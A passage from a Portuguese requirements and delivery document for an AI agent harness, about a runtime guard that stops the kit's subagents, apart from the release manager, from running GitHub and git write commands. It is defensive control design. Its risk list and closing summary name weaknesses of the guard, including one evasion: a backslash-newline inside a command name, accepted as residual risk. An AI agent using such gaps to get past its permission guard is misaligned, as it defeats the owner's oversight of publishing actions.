- D5 Contornos conhecidos: declarados aqui e na emenda do ADR, não corrigidos (R9; seção 2.4).
- D6 Função pura em `hooks/lib/`, testes unitários para cada exemplo de R2, ligada ao caminho `tool.call` já existente por `guardBash` para `Bash`, `Monitor` e `PowerShell`, sem hook `command` (R1, R2, R3).
- D7 Emenda da seção 2 do ADR-005, exceção estreita, datada de 2026-10-21, com D5 (R9).
- D8 Texto do `release-manager` corrigido; o texto de PR vai só ao `qa-verifier` (R10).
- D9 Medição M1 pelo `qa-verifier` no QA; se falhar, a trava só é entregue depois que o dono decidir (R8).
- D10 Receita do opencode conforme M2; o opencode é a segunda exceção nomeada (R11, R12).
- D11 Pegadinha do auto-casamento e kill por pid ou padrão com colchetes (R13, R14).
- D12 Versão 0.32.1, CHANGELOG, roadmap pt/en, tutorial, contagens inalteradas, prova de clone limpo, parada antes do merge (R15 a R19).

## Apêndice

### Tickets sugeridos

| Ticket | `lane` | Executor | Conjunto de escrita |
|---|---|---|---|
| T-2701 | `backend` | `builder` (TypeScript) | `adapters/claude-code/plugin/hooks/lib/` (arquivo novo da trava e seu teste), `adapters/claude-code/plugin/hooks/panel.ts`, `adapters/claude-code/plugin/hooks/panel.engine.test.ts`. Regras R1 a R7 |
| T-2702 | `backend` (fonte do kit) | `harness-maintainer` com `harness-authoring` | `.skills/external-clis/**`, `.agents/release-manager.md`, `.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md` (só onde o R15 achar ocorrências), `docs/adr/ADR-005-trava-de-runtime-por-mod.md`. Regras R9 a R14, parte do R15 |
| T-2703 | `backend` (Go e docs) | `builder` (Go), depois `docs-guide` | `internal/build/build.go`, `.claude-plugin/marketplace.json`, `CHANGELOG.md`, `docs/tutorial.html`, `docs/en/tutorial.html`, `docs/roadmap.html`, `docs/en/roadmap.html`. Regras R15 (parte de docs), R17 |
| T-2704 | `teste (unitário e integração)` | `qa-verifier` | Roda M1 (R8), os greps de R10 a R16, R19, a prova de clone limpo (R17) e o casamento de caminhos críticos (R18). Nenhum código de produção |

Ordem: T-2701 e T-2702 podem rodar em paralelo (os conjuntos de escrita são disjuntos). T-2703 vem depois dos dois (os docs descrevem o texto final). T-2704 vem depois de todos. A sequência do gate de release está em R17: `dh validate`, `go test ./...`, `go run ./cmd/dh build` sem diff em `dist/`, a prova de clone limpo, depois o candidato a commit; push, PR e tag só depois da prova, e o merge só depois do ok do dono (R18).

### Riscos e decisões pendentes

- Risco: um subagente legítimo do kit precisa de `git push` ou de uma escrita do `gh` · mitigação: só o `release-manager` publica (D1); o Coordenador o despacha, ou a sessão principal roda o comando. Fato: `grep -rn 'git push\|gh pr merge\|gh pr create' .agents .skills .commands` acha só prosa que proíbe ou descreve um risco residual, então nenhum fluxo atual de um agente do kit que não seja de release precisa de um.
- Risco: a regra dá um falso positivo em um comando legítimo · mitigação: a mensagem de negação aponta para a ferramenta Grep, e o dono pode rodar o comando na sessão principal. Os casos aceitos são os listados em 2.3. Os casos de falso negativo são os contornos de 2.4.
- Risco: uma leitura legítima do `gh` fora da lista de leituras é negada · mitigação: a sessão principal a roda, ou um PRD posterior estende a lista. Hipótese: nenhum fluxo atual do kit precisa de uma; o autor do ticket roda `grep -rn 'gh ' .agents .skills .commands` e reporta cada chamada `gh` que a lista de permitidos nega.
- Risco: o engine pode não passar `agentId` para chamadas de `Monitor` e `PowerShell`, ou o `Monitor` pode nomear seu campo de comando de outro jeito · mitigação: o teste do engine R5 g para o `Monitor`. Fato: a entrada do `PowerShell` traz o texto do comando em `command`, uma string, igual ao `Bash` (docs do Claude Code, página de hooks, `tool_input` do `PowerShell`). O mod nega uma chamada de `PowerShell` de um subagente do kit no escopo quando `command` falta ou não é uma string (R5 h). Hipótese: o `Monitor` também usa `command`; o autor do ticket confirma o nome do campo pelas definições de tipo do engine. Uma chamada de `Monitor` sem `command` é um monitor que não é de shell e não é negada.
- Risco: o engine pode não passar `agentId` na chamada de Bash de um subagente, ou pode não aplicar `deny` no modo `bypass` · mitigação: M1 (R8). Fato: `hooks/runtime-guard.ts` já depende do `agentId` para `Write` e `Edit`, e o `panel.engine.test.ts` já o envia. Hipótese: o mesmo vale para o `Bash`; M1 prova.
- Risco: a forma do opencode começa com `cd`, então uma regra de permissão `Bash(opencode:*)` não casa · aceito, declarado na receita (R11), igual ao `claude`.
- Premissa: o nome de arquivo `gh-guard.ts` da trava é proposta do autor.
- Decisão pendente: nenhuma bloqueia os tickets. A única condicional é M1 (R8).

## Resumo executado

- **Entregue:** No Claude Code, o mod nega `gh` fora de uma lista curta de leituras, e `git` com uma palavra de escrita, nas chamadas de Bash, Monitor e PowerShell de subagentes do kit exceto o `release-manager`, pela regra curta de texto de 2.3. A receita do opencode usa a forma medida da v2.0.32, e as receitas de kill do `external-clis` usam um pid registrado ou um padrão com colchetes.
- **Regras:**
  - R1 Cumprida: `adapters/claude-code/plugin/hooks/lib/gh-guard.ts` exporta `ghWriteVerb` e `ghDenied` sem E/S; seus testes unitários a chamam diretamente.
  - R2 Cumprida: `adapters/claude-code/plugin/hooks/lib/gh-guard.test.ts`; a rodada 8 do QA rodou os 192 casos de R2 sem nenhum caso negado que passasse a ser permitido; `claude plugin test` 250 passam, 0 falham, na fonte e em `dist/`.
  - R3 Cumprida: o caminho `guardBash` do `panel.ts` checa as chamadas de Bash, Monitor e PowerShell; o `hooks.json` está inalterado (QA do T-2704).
  - R4 a R7 Cumpridas: os testes do engine em `panel.engine.test.ts` (casos a a h, as quatro partes da mensagem de negação, falha aberta em erro da trava) passam (QA do T-2704 e rodadas 2 a 8).
  - R8 Cumprida: M1 passou, `<harness dir>/tasks/T-2704/evidence/m1-output.txt`: no modo `bypass` a chamada do `dh:qa-verifier` foi negada com a mensagem de R6, e a chamada do `dh:release-manager` imprimiu o texto de ajuda.
  - R9 Cumprida: o ADR-005 tem a emenda datada de 2026-10-21 com "Alterado por" PRD-027, e a emenda de 2026-10-22 que registra as emendas 6 a 8 e os contornos de 2.4.
  - R10 a R16 Cumpridas: os greps do QA do T-2704 estão limpos; as contagens continuam em 13 agentes, 19 + 1 comandos e 14 templates; o `dh validate` tem 0 erros.
  - R17 Cumprida: versão 0.32.1 em `internal/build/build.go`, `.claude-plugin/marketplace.json` e no ref da fonte; o `CHANGELOG.md` e os dois roadmaps têm a 0.32.1; um segundo build muda só `generated_at`; `dh validate` 0 erros, `go test ./...` passa, `claude plugin test` 250 passam, 0 falham (rodada 8 do QA). A prova de clone limpo roda no candidato a commit antes do push, e o corpo do PR registra seu resultado.
  - R18 Cumprida: o PR toca `adapters/claude-code/plugin/hooks/**` e `.skills/external-clis/**`; o dono deu o ok do merge em 2026-10-22.
  - R19 Cumprida: o `dh validate` (`checkPrivatePaths`) passa.
- **Tickets:**
  - T-2701, `backend`, `approved`: rodada 8 do QA aprovada (`PASS`); revisão de código `cli:codex/gpt-6-luna` `approve` na rodada 7.
  - T-2702, `backend` (fonte do kit), `approved`: QA do T-2704 (greps de R9 a R15).
  - T-2703, `backend` (Go e docs), `approved`: rodada 8 do QA (build, versão, checagem de deriva do roadmap do `dh validate`).
  - T-2704, `teste (unitário e integração)`, `approved`: M1 passou; rodada 8 do QA aprovada (`PASS`).
- **Docs:** `docs/adr/ADR-005-trava-de-runtime-por-mod.md`, `.agents/release-manager.md`, `.commands/review.md`, `.skills/external-clis/SKILL.md` e `references/opencode.md`, `clone-isolation.md`, `live-tree-freeze.md`, `agy.md`, `claude.md`, `gotchas.md`, `docs/tutorial.html`, `docs/en/tutorial.html`, `docs/roadmap.html`, `docs/en/roadmap.html`, `CHANGELOG.md`, `AGENTS.md` (linha "Trava de `gh`").
- **Fora do escopo:** os itens da seção 5, e os contornos aceitos de 2.4. A rodada 7 da revisão de segurança achou mais um: uma barra invertida seguida de nova linha dentro de um nome de comando. O dono o aceitou como risco residual em 2026-10-22 (opção "a"); sua mitigação de uma linha é candidata a um release posterior.
